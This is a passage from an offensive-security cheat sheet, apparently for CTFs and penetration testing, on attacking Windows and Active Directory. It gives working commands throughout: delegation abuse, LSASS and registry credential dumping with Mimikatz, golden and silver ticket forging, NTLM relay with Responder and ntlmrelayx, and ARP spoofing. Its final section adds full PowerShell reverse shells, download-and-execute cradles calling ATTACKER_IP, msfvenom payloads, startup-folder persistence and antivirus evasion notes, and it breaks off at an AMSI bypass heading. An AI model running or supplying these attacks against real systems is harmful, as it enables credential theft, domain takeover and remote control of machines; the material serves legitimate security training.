[Inference] Constrained delegation to one service often allows access to related services through SPN manipulation:

```bash
# Delegated to TIME service, request LDAP instead
impacket-getST -spn TIME/dc.domain.local -impersonate Administrator -altservice LDAP -dc-ip dc.ip domain.local/serviceaccount:password

# Common alternative services
# TIME -> LDAP, CIFS, HTTP, HOST
# HTTP -> CIFS, HOST
# CIFS -> HTTP, HOST

# DCSync using LDAP alternative service
export KRB5CCNAME=Administrator.ccache
impacket-secretsdump -k -no-pass @dc.domain.local -just-dc
```

**Resource-Based Constrained Delegation (RBCD)**

RBCD allows computers to configure which accounts can delegate to them via `msDS-AllowedToActOnBehalfOfOtherIdentity`.

**Requirements for RBCD Attack**

- Write access to `msDS-AllowedToActOnBehalfOfOtherIdentity` on target computer
- Ability to create computer accounts or control existing computer account

**RBCD Exploitation Steps**

```bash
# Step 1: Create a new computer account (requires MAQ > 0, default 10)
impacket-addcomputer -computer-name 'ATTACKER$' -computer-pass 'Password123' -dc-ip dc.ip domain.local/username:password

# Step 2: Set RBCD on target computer
impacket-rbcd -delegate-from 'ATTACKER$' -delegate-to 'TARGET$' -action write -dc-ip dc.ip domain.local/username:password

# Step 3: Request service ticket impersonating Administrator
impacket-getST -spn CIFS/target.domain.local -impersonate Administrator -dc-ip dc.ip domain.local/'ATTACKER$':'Password123'

# Step 4: Use ticket for access
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass domain.local/Administrator@target.domain.local
```

**Checking Machine Account Quota (MAQ)**

```bash
# Using ldapsearch
ldapsearch -x -H ldap://dc.ip -D "username@domain.local" -w 'password' -b "dc=domain,dc=local" "objectClass=domain" ms-DS-MachineAccountQuota

# Using CrackMapExec
crackmapexec ldap dc.ip -u username -p password -M maq
```

**RBCD Cleanup**

```bash
# Remove delegation configuration
impacket-rbcd -delegate-from 'ATTACKER$' -delegate-to 'TARGET$' -action remove -dc-ip dc.ip domain.local/username:password

# Remove created computer account
impacket-addcomputer -computer-name 'ATTACKER$' -delete -dc-ip dc.ip domain.local/username:password
```

**Cross-Domain Delegation Considerations**

[Unverified] Cross-forest delegation configurations may present additional attack vectors, though specific exploitation depends on trust relationships and delegation boundaries configured by administrators. Testing required for each environment.

---

## Windows Credential Access

### Mimikatz Exploitation

Mimikatz is a post-exploitation tool that extracts credentials from Windows memory and performs credential-based attacks. The tool operates primarily by interacting with the Local Security Authority Subsystem Service (LSASS) process.

#### LSASS Memory Dumping

The `sekurlsa::logonpasswords` module is the primary method for extracting plaintext credentials and hashes from memory:

```
mimikatz # sekurlsa::logonpasswords
```

This command reads the LSASS process memory and outputs all credentials stored by Windows authentication systems. The output includes usernames, domain names, LAN Manager (LM) hashes, NT LAN Manager (NTLM) hashes, and plaintext passwords if available (particularly for interactive sessions).

Common variations and related modules:

```
sekurlsa::tickets          # Extract Kerberos tickets (TGT/TGS)
sekurlsa::kerberos         # Kerberos credential extraction
sekurlsa::wdigest          # WDigest credentials (HTTP/NTLM auth)
sekurlsa::tspkg            # Terminal Services Package credentials
sekurlsa::msv              # MSV credentials (NTLM hashes)
sekurlsa::credman           # Windows Credential Manager secrets
sekurlsa::ssp               # SSP (Security Support Provider) credentials
```

#### Prerequisite Privileges

Mimikatz requires elevated (administrative) privileges to access LSASS memory. Common execution contexts:

Running Mimikatz with UAC bypass on modern Windows systems:

```
mimikatz # privilege::debug
```

Verify debug privilege is enabled before attempting credential extraction. If `privilege::debug` fails, the process does not have sufficient rights to access LSASS.

#### Memory Dump Analysis

Alternative approach using process dumping:

```
tasklist | findstr lsass
procdump -accepteula -ma <LSASS_PID> lsass.dmp
```

Extract credentials from the dumped memory file using Mimikatz:

```
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

This method is useful when direct LSASS access is restricted or when avoiding direct process interaction is necessary.

### SAM and SYSTEM Registry Hive Extraction

The Security Account Manager (SAM) database stores local user account credentials as NTLM hashes. The SYSTEM registry hive contains cryptographic keys necessary for decrypting SAM entries.

#### Registry Hive Extraction Methods

Extracting hives from a running system requires administrative privileges:

```
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
reg save HKLM\SECURITY C:\temp\SECURITY
```

Alternatively, using Volume Shadow Copy (VSS) to extract hives from locked files:

```
vssadmin list shadows
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM
```

#### Hash Extraction from Hives

Using Mimikatz to parse extracted hives:

```
mimikatz # lsadump::sam /sam:C:\temp\SAM /system:C:\temp\SYSTEM
```

Output format includes username, RID (Relative Identifier), LM hash, and NTLM hash for each local user account.

Using Hashcat or John the Ripper for offline cracking:

```
hashcat -m 1000 -a 0 hashes.txt wordlist.txt   # NTLM hashes
john --format=NT hashes.txt --wordlist=wordlist.txt
```

#### Impacket Tools for Hash Extraction

On Kali Linux, use impacket's `secretsdump.py` for remote SAM extraction over SMB:

```
secretsdump.py -no-pass WORKGROUP/Administrator@<target_ip>
secretsdump.py -hashes :<NTLM_hash> WORKGROUP/Administrator@<target_ip>
```

### Cached Credential Extraction

Windows caches domain credentials locally to allow cached logon when domain controllers are unavailable. These cached credentials are stored as NTLM hashes in the registry.

#### Registry Location

Cached credentials are stored in:

```
HKEY_LOCAL_MACHINE\SECURITY\Cache
```

Extraction via Mimikatz:

```
mimikatz # lsadump::cache
```

This module requires `SYSTEM` and `SECURITY` hive access.

#### Manual Registry Extraction

Extract the SECURITY hive:

```
reg save HKLM\SECURITY C:\temp\SECURITY
```

Using Mimikatz with extracted SECURITY hive:

```
mimikatz # lsadump::cache /security:C:\temp\SECURITY
```

#### Cached Credential Characteristics

[Inference] Cached credentials are typically stored with MS-Cache format hashes (MS-Cache v1 or v2), which use a salted PBKDF2 derivation. The number of cached entries is configurable (default varies by Windows version); older systems cache more credentials. These hashes are computationally more expensive to crack than raw NTLM hashes due to their derivation method.

#### Cracking Cached Credentials

Using Hashcat:

```
hashcat -m 2100 -a 0 cached_hashes.txt wordlist.txt   # MS-Cache v1
hashcat -m 2100 -a 0 cached_hashes.txt wordlist.txt   # MS-Cache v2
```

Using John the Ripper:

```
john --format=mscache cached_hashes.txt --wordlist=wordlist.txt
john --format=mscache2 cached_hashes.txt --wordlist=wordlist.txt
```

### Practical CTF Exploitation Workflow

Establish initial access (reverse shell, RDP session, etc.) with any user account.

Check current privilege level:

```
whoami /priv
```

Attempt privilege escalation if not already SYSTEM/Administrator.

Extract credentials:

```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # lsadump::sam /sam:sam_path /system:system_path
mimikatz # lsadump::cache /security:security_path
```

Extract registry hives if Mimikatz access is restricted:

```
reg save HKLM\SAM sam.reg
reg save HKLM\SYSTEM system.reg
reg save HKLM\SECURITY security.reg
```

Use extracted credentials for lateral movement or privilege escalation to higher-privileged accounts.

### Tool Limitations and Detection Mitigation

[Inference] Mimikatz triggers Windows Defender and most endpoint detection systems. Obfuscation techniques include renaming the executable, using alternate data streams, or loading Mimikatz as a DLL in memory. Process injection methods and reflective DLL injection can avoid disk-based detection.

VSS extraction methods may be disabled on hardened systems through Group Policy (Volume Shadow Copy service disabled). Alternative methods include extracting hives from offline system images or cold-start scenarios where the OS is not running.

Modern Windows versions (Windows 10/11 with Credential Guard enabled) may prevent LSASS credential extraction entirely, requiring alternative techniques such as DPAPI key extraction or targeting other credential stores (Credential Manager, Browser storage).

### Kerberos Ticket Extraction

Kerberos ticket extraction involves retrieving Kerberos tickets (TGT/TGS) from memory or the filesystem to enable lateral movement, persistence, or privilege escalation through pass-the-ticket attacks.

#### Ticket Storage Locations

**Windows Ticket Cache:**
- Tickets stored in LSASS process memory (protected by default in modern Windows)
- File-based tickets: `%TEMP%` or user profile directories (less common)
- Credential Manager stores tickets for session 0 and user sessions

#### Mimikatz Ticket Extraction

**Extract All Tickets from Memory:**
```bash
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```

**Extract Specific Ticket Types:**
```bash
# TGT only
mimikatz # sekurlsa::tickets /export /tgt

# TGS only  
mimikatz # sekurlsa::tickets /export /tgs
```

**List Cached Tickets:**
```bash
mimikatz # sekurlsa::tickets
```

The `/export` parameter saves tickets as `.kirbi` files in the current directory with naming format: `[session_id]-[logon_id]-[user]@[service]-[domain].kirbi`

#### Rubeus Ticket Operations

**Dump All Tickets:**
```bash
Rubeus.exe dump

# Dump with LUID filter
Rubeus.exe dump /luid:0x3e7

# Dump for specific user
Rubeus.exe dump /user:administrator
```

**Monitor for New Tickets:**
```bash
Rubeus.exe monitor /interval:10 /filteruser:target_user
```

**Convert Ticket Formats:**
```bash
# Convert .kirbi to base64 (for injection)
Rubeus.exe describe /ticket:ticket.kirbi

# Convert base64 to .kirbi
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("base64_blob"))
```

#### Impacket Ticket Extraction (Linux)

**Extract with secretsdump:**
```bash
# Extract tickets from NTDS.dit or SAM (requires domain controller access)
secretsdump.py DOMAIN/user:password@target_dc -just-dc-user krbtgt
```

**Convert ccache to kirbi:**
```bash
# Linux ccache format to Windows kirbi
ticketConverter.py ticket.ccache ticket.kirbi

# Reverse conversion
ticketConverter.py ticket.kirbi ticket.ccache
```

#### Pass-the-Ticket Implementation

**Inject Ticket with Mimikatz:**
```bash
mimikatz # kerberos::ptt ticket.kirbi

# Verify injection
mimikatz # kerberos::list
```

**Inject Ticket with Rubeus:**
```bash
Rubeus.exe ptt /ticket:ticket.kirbi

# Inject base64 encoded ticket
Rubeus.exe ptt /ticket:base64_blob
```

**Use Ticket from Linux:**
```bash
# Set KRB5CCNAME environment variable
export KRB5CCNAME=/path/to/ticket.ccache

# Verify ticket
klist

# Use with Impacket tools
psexec.py -k -no-pass DOMAIN/user@target_host
```

#### Advanced Ticket Extraction Techniques

**Extracting Tickets Without Administrator Privileges:**
```bash
# Using Rubeus triage (non-elevated)
Rubeus.exe triage

# Request TGT for current user
Rubeus.exe asktgt /user:current_user /rc4:ntlm_hash /domain:domain.com
```

**Extracting Service Tickets (Kerberoasting Preparation):**
```bash
# Request service tickets
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/server.domain.com:1433"

# Export requested tickets
Rubeus.exe dump /service:MSSQLSvc /nowrap
```

#### Ticket Manipulation

**Silver Ticket Creation (Forged TGS):**
```bash
mimikatz # kerberos::golden /domain:domain.com /sid:S-1-5-21-... /target:target.domain.com /service:cifs /rc4:service_account_hash /user:fakeuser /ptt
```

**Golden Ticket Creation (Forged TGT):**
```bash
mimikatz # kerberos::golden /domain:domain.com /sid:S-1-5-21-... /rc4:krbtgt_hash /user:administrator /id:500 /ptt
```

**[Inference]** Golden tickets typically remain valid for 10 years by default unless explicitly configured differently, while silver tickets are limited by the target service account's password change cycle.

#### Detection Evasion Considerations

**Operational Security Notes:**
- Ticket extraction from LSASS triggers ETW events (Event ID 4688, 10)
- PPL (Protected Process Light) on LSASS blocks Mimikatz on Windows 10 1607+
- Rubeus uses direct Windows API calls, generating less AV/EDR alerts than Mimikatz
- Ticket injection creates Event ID 4768 (TGT requested) and 4769 (TGS requested)

**Alternative Extraction Methods:**
```bash
# Dump LSASS process memory
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Extract tickets from dump offline
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::tickets /export
```

---

### WDigest Attacks

WDigest is a legacy authentication protocol that stores plaintext credentials in LSASS memory. While disabled by default on Windows 8.1/Server 2012 R2 and later, it remains a critical attack vector when enabled or on legacy systems.

#### WDigest Configuration Status

**Check WDigest Status:**
```powershell
# Registry check
reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential

# Value 0 = disabled (default on modern Windows)
# Value 1 = enabled (plaintext storage active)
# Key missing = enabled on Windows 7/Server 2008 R2
```

**Enable WDigest (Post-Exploitation):**
```powershell
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
```

**[Unverified]** Changes take effect when users authenticate interactively after enabling WDigest. Existing sessions may not immediately expose plaintext credentials until new authentication events occur.

#### Credential Extraction with WDigest Enabled

**Mimikatz Extraction:**
```bash
mimikatz # privilege::debug
mimikatz # sekurlsa::wdigest

# Alternative full credential dump
mimikatz # sekurlsa::logonpasswords
```

Output format identifies WDigest credentials:
```
Authentication Id : 0 ; 123456
Session           : Interactive from 1
User Name         : target_user
Domain            : CORP
Logon Server      : DC01
Logon Time        : 1/15/2025 10:30:00 AM
SID               : S-1-5-21-...
        wdigest :
         * Username : target_user
         * Domain   : CORP
         * Password : PlaintextPassword123
```

**Procdump + Mimikatz (Offline Analysis):**
```bash
# On target (requires SeDebugPrivilege)
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Transfer to attacker machine
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

#### Impacket Credential Extraction

**Remote WDigest Extraction:**
```bash
# Requires administrative access and RPC access to target
secretsdump.py DOMAIN/admin:password@target_host
```

Impacket's secretsdump cannot directly extract WDigest from live memory but retrieves cached credentials if dumping SAM/LSA secrets.

#### Force Password Updates for WDigest Capture

**Interactive Logon Triggers:**
```powershell
# Lock workstation (forces re-authentication)
rundll32.exe user32.dll,LockWorkStation

# Scheduled task requiring credentials
schtasks /create /tn "CredentialCapture" /tr "cmd.exe /c echo test" /sc once /st 00:00 /ru DOMAIN\user /rp
```

**[Inference]** Network authentication (SMB, RDP) typically triggers credential caching, but remote desktop sessions are most reliable for capturing plaintext WDigest credentials after enabling the feature.

#### Detection and Forensic Artifacts

**Registry Modifications:**
```powershell
# Audit UseLogonCredential changes
Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest | Select-Object PSPath, UseLogonCredential, PSChildName
```

**Event Logs:**
- Event ID 4657: Registry value modification (if object access auditing enabled)
- Event ID 4688: Process creation (mimikatz.exe, procdump.exe)
- Event ID 4673: Sensitive privilege use (SeDebugPrivilege for LSASS access)

#### Alternative Credential Extraction Methods

**pypykatz (Python-based Mimikatz alternative):**
```bash
# Parse LSASS dump offline
pypykatz lsa minidump lsass.dmp

# Remote extraction via SMB
pypykatz smb DOMAIN/user:password@target_host
```

**Sysinternals ProcDump Alternatives:**
```powershell
# Windows Task Manager (manual dump)
# Right-click lsass.exe → Create dump file

# PowerShell Out-Minidump
Import-Module .\Out-Minidump.ps1
Get-Process lsass | Out-Minidump
```

#### Mitigation Bypasses

**Credential Guard Limitations:**
- Credential Guard protects LSA secrets but does not prevent WDigest from storing plaintext if explicitly enabled
- Requires UEFI, Secure Boot, and virtualization-based security (VBS)

**[Unverified]** Some sources suggest Credential Guard partially protects WDigest, but Microsoft documentation indicates WDigest should be disabled regardless of Credential Guard status for maximum security.

---

### NTLM Relay Attacks

NTLM relay attacks intercept and forward NTLM authentication attempts to target services without cracking password hashes. These attacks exploit the challenge-response nature of NTLM by relaying authentication messages between client and server.

#### Attack Prerequisites

**Required Conditions:**
1. SMB signing disabled or not enforced on target
2. Relayed user must have administrative privileges on target (for most exploitation)
3. Network position allowing interception (ARP spoofing, LLMNR/NBT-NS poisoning, or mitm)

**Check SMB Signing Status:**
```bash
# Nmap NSE script
nmap --script smb-security-mode.nse -p445 target_host

# CrackMapExec
crackmapexec smb target_host --gen-relay-list relay_targets.txt

# Impacket
GetNPUsers.py -dc-ip domain_controller DOMAIN/ -usersfile users.txt -request
```

Output indicates signing status:
```
Message signing enabled but not required (vulnerable)
Message signing enabled and required (not vulnerable)
```

#### Responder for Credential Capture

**Basic Responder Configuration:**
```bash
# Edit /etc/responder/Responder.conf
# Set SMB = Off, HTTP = Off (to enable relay mode)

# Start Responder
responder -I eth0 -wv

# WPAD-specific poisoning
responder -I eth0 -wFv
```

**Targeted Poisoning:**
```bash
# Analyze network for poisoning opportunities
responder -I eth0 -A

# Custom WPAD configuration
# Edit Responder.conf WPAD section for targeted JS payload
```

#### ntlmrelayx Configuration

**Basic SMB Relay:**
```bash
# Relay to single target
ntlmrelayx.py -t smb://target_host -smb2support

# Relay to multiple targets from file
ntlmrelayx.py -tf targets.txt -smb2support

# Interactive SMB shell on relay
ntlmrelayx.py -t smb://target_host -smb2support -i
```

**Command Execution on Relay:**
```bash
# Execute single command
ntlmrelayx.py -t smb://target_host -smb2support -c "whoami"

# Execute commands from file
ntlmrelayx.py -t smb://target_host -smb2support -c @commands.txt

# Socks proxy for connection pivoting
ntlmrelayx.py -tf targets.txt -smb2support -socks
```

#### HTTP to SMB Relay

**LDAP(S) Relay Attacks:**
```bash
# Relay to LDAP for domain privilege escalation
ntlmrelayx.py -t ldap://domain_controller -smb2support --escalate-user lowpriv_user

# LDAPS relay (requires valid certificate)
ntlmrelayx.py -t ldaps://domain_controller -smb2support --escalate-user lowpriv_user

# Add computer account (delegated authentication abuse)
ntlmrelayx.py -t ldaps://domain_controller -smb2support --add-computer
```

**HTTP to SMB:**
```bash
# Capture HTTP NTLM authentication and relay to SMB
ntlmrelayx.py -t smb://target_host -smb2support

# Trigger by forcing HTTP authentication:
# - Malicious shortcut file (.lnk, .url pointing to attacker IP)
# - Malicious document with remote template injection
# - WPAD poisoning redirecting proxy authentication
```

#### Advanced Relay Techniques

**Cross-Protocol Relay:**
```bash
# HTTP → LDAP
ntlmrelayx.py -t ldap://domain_controller -smb2support -wh attacker_wpad_host

# SMB → LDAP
ntlmrelayx.py -t ldap://domain_controller -smb2support

# HTTP → HTTP (WebDAV)
ntlmrelayx.py -t http://target_host -smb2support
```

**Multi-Relay Attack:**
```bash
# Start Responder (poisoning)
responder -I eth0 -wv

# Separate terminal: ntlmrelayx
ntlmrelayx.py -tf targets.txt -smb2support -c "powershell -enc <base64_payload>"
```

#### Exploitation Post-Relay

**Dumping Credentials:**
```bash
# SAM/LSA dump on relay
ntlmrelayx.py -t smb://target_host -smb2support -c "reg save HKLM\SAM C:\Windows\Temp\sam.hive"

# Automated secretsdump
ntlmrelayx.py -t smb://target_host -smb2support --dump
```

**Socks Proxy for Tool Pivoting:**
```bash
# Start ntlmrelayx with socks
ntlmrelayx.py -tf targets.txt -smb2support -socks

# Configure proxychains
# Edit /etc/proxychains4.conf: socks4 127.0.0.1 1080

# Use tools through relay
proxychains secretsdump.py DOMAIN/user@relayed_target -no-pass
proxychains smbclient.py DOMAIN/user@relayed_target -no-pass
```

**Interactive Shell Access:**
```bash
# Start relay with interactive mode
ntlmrelayx.py -t smb://target_host -smb2support -i

# Connect to interactive shell (output shows port, typically 11000)
nc 127.0.0.1 11000

# Available commands in shell:
shares  # List shares
use share_name  # Access specific share
ls, cd, get, put  # File operations
```

#### NTLM Relay to ADCS (Certificate Services)

**ESC8 Attack (Web Enrollment Relay):**
```bash
# Relay to ADCS web enrollment
ntlmrelayx.py -t http://ca_server/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Alternative with petitpotam trigger
# Terminal 1: ntlmrelayx
ntlmrelayx.py -t http://ca_server/certsrv/certfnsh.asp -smb2support --adcs

# Terminal 2: PetitPotam
python3 PetitPotam.py attacker_ip target_dc
```

**[Inference]** ADCS relay attacks allow certificate-based authentication, potentially enabling persistent domain access or DCSync privileges depending on the certificate template configuration.

#### MitM Positioning Techniques

**ARP Spoofing for Relay:**
```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP spoof target
arpspoof -i eth0 -t target_client gateway_ip
arpspoof -i eth0 -t gateway_ip target_client

# Alternative: Bettercap
bettercap -iface eth0
> set arp.spoof.targets target_ip
> arp.spoof on
> net.sniff on
```

**LLMNR/NBT-NS Poisoning:**
```bash
# Responder handles poisoning automatically
responder -I eth0 -wv

# Manual NBT-NS spoofing (if Responder disabled)
# Edit /etc/responder/Responder.conf: NBT-NS = On
```

#### Detection Evasion

**Randomizing Relay Traffic:**
```bash
# Delay between relay attempts
ntlmrelayx.py -tf targets.txt -smb2support --random-delay

# Custom user-agent (HTTP relay)
ntlmrelayx.py -t http://target -smb2support --user-agent "Mozilla/5.0..."
```

**Avoiding Logs:**
- Relay attacks generate Event ID 4624 (Logon) Type 3 (Network) on target
- Source IP shows attacker relay host, not original client
- SMB relay creates suspicious authentication patterns (multiple rapid attempts)

**[Unverified]** Some defensive tools detect relay attacks by monitoring for authentication requests with identical challenge-response pairs across multiple hosts, but this detection method's effectiveness varies by implementation.

#### Mitigation Bypass Techniques

**SMB Signing Enforcement Bypass:**
- **[Unverified]** When SMB signing is required, relay attacks to SMB targets fail
- Alternative targets: LDAP, HTTP, MSSQL services often lack signing enforcement
- Cross-protocol relay to unsigned services remains viable

**NTLM Authentication Drop-the-Mic (CVE-2019-1040):**
```bash
# Exploit removes MIC (Message Integrity Code) for relay
# Requires specific ntlmrelayx version/patch
ntlmrelayx.py -t ldaps://domain_controller --remove-mic -smb2support
```

**[Unverified]** CVE-2019-1040 exploitation allows LDAPS relay despite signing, but requires specific Windows patch levels and attack timing.

---

### Important Related Subtopics

For complete Windows credential access coverage, investigate:
- **Kerberoasting** (extracting and cracking service account tickets)
- **AS-REP Roasting** (exploiting accounts with Kerberos pre-authentication disabled)
- **DCSync attacks** (replicating domain credentials via Directory Replication Service)
- **Token manipulation** (access token theft, duplication, and impersonation)
- **Credential vault/DPAPI exploitation** (extracting stored credentials from Windows Credential Manager)

---

## Reverse Shell Techniques (Windows)

### cmd.exe Reverse Shells

**Traditional cmd.exe NetCat Method**

When netcat is available on the target Windows system:

```cmd
nc.exe -e cmd.exe <ATTACKER_IP> <PORT>
```

**cmd.exe without NetCat - Using PowerShell Wrapper**

```cmd
cmd.exe /c "powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER_IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()""
```

**[Inference]** cmd.exe reverse shells are less common in modern CTFs because PowerShell provides more robust functionality, but they remain relevant for legacy systems or restricted environments.

### PowerShell Reverse Shells

**Base64 Encoded One-Liner**

Generate the payload:

```bash
# On Kali - Create base64 encoded PowerShell reverse shell
echo -n '$client = New-Object System.Net.Sockets.TCPClient("<ATTACKER_IP>",<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv -t UTF-16LE | base64 -w 0
```

Execute on target:

```powershell
powershell -nop -w hidden -e <BASE64_PAYLOAD>
```

**PowerShell Download and Execute Pattern**

```powershell
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/shell.ps1')"
```

**Nishang Invoke-PowerShellTcp**

```powershell
# On Kali - modify Invoke-PowerShellTcp.ps1, add to bottom:
Invoke-PowerShellTcp -Reverse -IPAddress <ATTACKER_IP> -Port <PORT>

# Serve via HTTP
python3 -m http.server 80

# On target
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/Invoke-PowerShellTcp.ps1')"
```

**PowerCat Reverse Shell**

```powershell
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<ATTACKER_IP>/powercat.ps1');powercat -c <ATTACKER_IP> -p <PORT> -e cmd"
```

**ConPtyShell (Fully Interactive TTY)**

[Unverified] ConPtyShell provides a more stable interactive shell using Windows Console Pseudo-terminal (ConPty) APIs.

```powershell
# On Kali
stty raw -echo; (stty size; cat) | nc -lvnp <PORT>

# On target (PowerShell 5.1+)
IEX(IWR http://<ATTACKER_IP>/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell <ATTACKER_IP> <PORT>
```

### msfvenom Windows Payloads

**Staged vs Stageless Payloads**

- **Staged** (`windows/meterpreter/reverse_tcp`): Smaller initial payload, downloads full Meterpreter in stages
- **Stageless** (`windows/meterpreter_reverse_tcp`): Complete payload included, larger file size but single connection

**EXE Payloads**

```bash
# Basic reverse shell EXE
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f exe -o shell.exe

# Meterpreter stageless (recommended for CTF stability)
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f exe -o met.exe

# 32-bit version
msfvenom -p windows/meterpreter_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f exe -o met32.exe

# Encoded to evade basic AV (may not bypass modern defenders)
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f exe -e x64/xor_dynamic -i 5 -o met_encoded.exe
```

**DLL Payloads**

```bash
# Reverse shell DLL (64-bit)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f dll -o shell.dll

# 32-bit DLL
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f dll -o shell32.dll

# Meterpreter DLL
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f dll -o met.dll
```

Execute DLL using `rundll32.exe`:

```cmd
rundll32.exe shell.dll,0
rundll32.exe C:\path\to\shell.dll,DllMain
```

**MSI Payloads**

```bash
# Generate MSI installer payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f msi -o shell.msi

# Meterpreter MSI
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f msi -o met.msi
```

Execute MSI:

```cmd
msiexec /quiet /qn /i shell.msi
msiexec /q /i http://<ATTACKER_IP>/shell.msi
```

**Additional Useful Formats**

**ASP/ASPX for Web Shells**

```bash
# ASP payload
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f asp -o shell.asp

# ASPX payload
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f aspx -o shell.aspx
```

**VBA Macro for Office Documents**

```bash
msfvenom -p windows/meterpreter_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f vba -o macro.vba
```

**HTA Application**

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f hta-psh -o shell.hta
```

**Listener Setup**

For msfvenom payloads using Metasploit:

```bash
msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_tcp
set LHOST <ATTACKER_IP>
set LPORT <PORT>
set ExitOnSession false
exploit -j
```

For non-Meterpreter shells, use netcat or socat:

```bash
nc -lvnp <PORT>
# or
rlwrap nc -lvnp <PORT>  # With readline support
```

### Batch Script Shells

**Basic Batch Reverse Shell (NetCat Required)**

```batch
@echo off
nc.exe -e cmd.exe <ATTACKER_IP> <PORT>
```

**Batch Script with PowerShell Fallback**

```batch
@echo off
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "& {$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER_IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"
```

**Batch Script Download and Execute**

```batch
@echo off
certutil -urlcache -split -f http://<ATTACKER_IP>/payload.exe %TEMP%\payload.exe
%TEMP%\payload.exe
```

**Batch Script with BITSAdmin**

```batch
@echo off
bitsadmin /transfer myDownloadJob /download /priority high http://<ATTACKER_IP>/shell.exe %TEMP%\shell.exe
start %TEMP%\shell.exe
```

**Persistence via Batch in Startup Folder**

```batch
@echo off
copy %0 "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\system.bat"
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/shell.ps1')"
```

### Shell Stabilization and Upgrade Techniques

**Upgrading to Meterpreter from cmd/PowerShell**

Once you have a basic shell, upgrade to Meterpreter:

```bash
# Generate web delivery payload
msfconsole
use exploit/multi/script/web_delivery
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <ATTACKER_IP>
set LPORT <PORT>
set TARGET 2  # PowerShell
exploit

# Execute the generated PowerShell command on target
```

**Interactive Shell Upgrade**

[Inference] Windows shells typically don't require PTY allocation like Linux, but you can improve interactivity:

```powershell
# Within PowerShell reverse shell
$Host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size(500, 3000)
```

### Evasion Considerations

**AMSI Bypass for PowerShell**

[Unverified] These bypasses may not work against updated Windows Defender or enterprise EDR solutions:

```powershell
# Basic AMSI bypass (may be signatured)
